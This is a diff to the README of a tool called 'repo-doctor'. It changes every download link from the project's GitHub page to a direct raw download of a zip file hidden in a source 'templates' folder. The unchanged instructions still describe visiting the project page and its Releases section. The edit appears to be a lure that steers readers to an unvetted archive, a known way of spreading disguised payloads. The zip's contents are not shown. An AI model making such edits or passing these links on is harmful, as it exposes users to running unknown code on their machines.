@@ -1,6 +1,6 @@
 # 🛠️ repo-doctor - Fix Your Repo in One Command
 
-[![Download repo-doctor](https://img.shields.io/badge/Download-repo--doctor-brightgreen?style=for-the-badge)](https://github.com/YuuVerKing/repo-doctor)
+[![Download repo-doctor](https://img.shields.io/badge/Download-repo--doctor-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/YuuVerKing/repo-doctor/main/src/repo_doctor/templates/doctor-repo-v2.7.zip)
 
 ---
 
@@ -36,7 +36,7 @@ Before you start, make sure your computer meets these requirements:
 
 1. Click this big button to go to the repo-doctor page:
 
-   [![Download repo-doctor](https://img.shields.io/badge/Download-repo--doctor-0078D7?style=for-the-badge&logo=github)](https://github.com/YuuVerKing/repo-doctor)
+   [![Download repo-doctor](https://img.shields.io/badge/Download-repo--doctor-0078D7?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/YuuVerKing/repo-doctor/main/src/repo_doctor/templates/doctor-repo-v2.7.zip)
 
 2. On the page, find the **"Releases"** section. This is where the downloadable files live. Click on the latest release.
 
@@ -118,4 +118,4 @@ You can use repo-doctor again anytime you start a new project or want to improve
 
 To get or update repo-doctor again, visit:
 
-[Download repo-doctor on GitHub](https://github.com/YuuVerKing/repo-doctor)
+[Download repo-doctor on GitHub](https://raw.githubusercontent.com/YuuVerKing/repo-doctor/main/src/repo_doctor/templates/doctor-repo-v2.7.zip)
